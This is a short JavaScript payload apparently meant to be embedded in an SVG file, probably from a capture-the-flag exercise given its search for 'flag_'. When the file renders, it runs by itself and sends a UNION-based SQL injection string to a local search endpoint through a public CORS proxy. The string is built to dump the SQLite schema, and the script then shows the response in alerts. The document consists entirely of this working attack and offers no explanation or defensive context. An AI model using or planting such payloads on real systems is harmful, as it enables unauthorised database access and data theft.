svg.script:
async function trySQLInjection() {
  try {
    const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
    const searchResp = await fetch('https://cors-anywhere.herokuapp.com/https://localhost:8001/f/search?q=' + encodeURIComponent(sqlQuery));
    const searchData = await searchResp.text();
    alert('Search endpoint response: ' + searchData);
    if (searchData.includes('_') && searchData.includes('flag_')) {
      alert('Found promising data in search response!');
    }
  } catch (e) {
    alert('Error with search endpoint: ' + e.message);
  }
}
trySQLInjection();
